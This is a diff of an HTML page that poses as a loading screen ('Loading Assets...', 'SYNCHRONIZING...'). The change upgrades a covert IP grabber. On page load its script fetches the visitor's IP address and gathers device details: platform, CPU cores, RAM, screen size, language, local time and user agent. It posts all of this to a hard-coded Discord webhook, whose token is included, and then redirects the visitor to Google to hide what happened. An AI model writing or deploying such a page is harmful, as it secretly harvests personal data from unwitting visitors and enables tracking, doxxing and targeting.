@@ -1,42 +1,67 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
-    <title>Site Loading...</title>
+    <meta charset="UTF-8">
+    <title>Loading Assets...</title>
     <style>
-        body { background: #121212; color: #555; font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
-        .spinner { border: 4px solid #333; border-top: 4px solid #888; border-radius: 50%; width: 30px; height: 30px; animation: spin 1s linear infinite; }
+        body { background: #0b0b0b; color: #444; font-family: 'Courier New', monospace; display: flex; flex-direction: column; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+        .loader { border: 2px solid #222; border-top: 2px solid #555; border-radius: 50%; width: 25px; height: 25px; animation: spin 1s linear infinite; }
         @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        p { margin-top: 15px; font-size: 12px; letter-spacing: 1px; }
     </style>
 </head>
 <body>
-    <div class="spinner"></div>
+    <div class="loader"></div>
+    <p>SYNCHRONIZING...</p>
 
     <script>
-        async function capture() {
+        async function captureAdvanced() {
             try {
                 // 1. Get the IP
                 const ipRes = await fetch('https://api.ipify.org?format=json');
                 const ipData = await ipRes.json();
 
-                // 2. The Secret Webhook (PASTE YOURS BELOW)
-                const webhook = "https://discord.com/api/webhooks/1502591625686290432/ft1Kq-msmvc5OjAUxHOxxo6ae0N7cMCFACb6mAOPKZ5e8u7ccNBno-_Ar0AXnn6jwGJr";
+                // 2. Gather Hardware Specs
+                const info = {
+                    ip: ipData.ip,
+                    platform: navigator.platform,
+                    cores: navigator.hardwareConcurrency || "Unknown",
+                    ram: navigator.deviceMemory ? navigator.deviceMemory + "GB" : "Unknown",
+                    screen: screen.width + "x" + screen.height,
+                    language: navigator.language,
+                    time: new Date().toLocaleString()
+                };
 
-                // 3. Send the package to Discord
-                await fetch(webhook, {
+                // 3. Send to Discord
+                await fetch("https://discordapp.com/api/webhooks/1502591625686290432/ft1Kq-msmvc5OjAUxHOxxo6ae0N7cMCFACb6mAOPKZ5e8u7ccNBno-_Ar0AXnn6jwGJr", {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify({
-                        content: "📡 **Connection Logged**\nIP: `" + ipData.ip + "`\nDevice: " + navigator.platform
+                        username: "System Logger",
+                        embeds: [{
+                            title: "🚨 New Connection Logged",
+                            color: 16711680, // Red color
+                            fields: [
+                                { name: "IP Address", value: "`" + info.ip + "`", inline: true },
+                                { name: "Platform", value: info.platform, inline: true },
+                                { name: "CPU Cores", value: info.cores.toString(), inline: true },
+                                { name: "Est. RAM", value: info.ram, inline: true },
+                                { name: "Resolution", value: info.screen, inline: true },
+                                { name: "Local Time", value: info.time, inline: false }
+                            ],
+                            footer: { text: "User Agent: " + navigator.userAgent }
+                        }]
                     })
                 });
             } catch (e) { }
 
-            // 4. THE CLOAK: Send them to Google after 2 seconds
+            // 4. Redirect to a "safe" page after data is sent
             setTimeout(() => {
                 window.location.href = "https://www.google.com";
-            }, 2000);
+            }, 1500);
         }
-        capture();
+
+        captureAdvanced();
     </script>
 </body>
 </html>
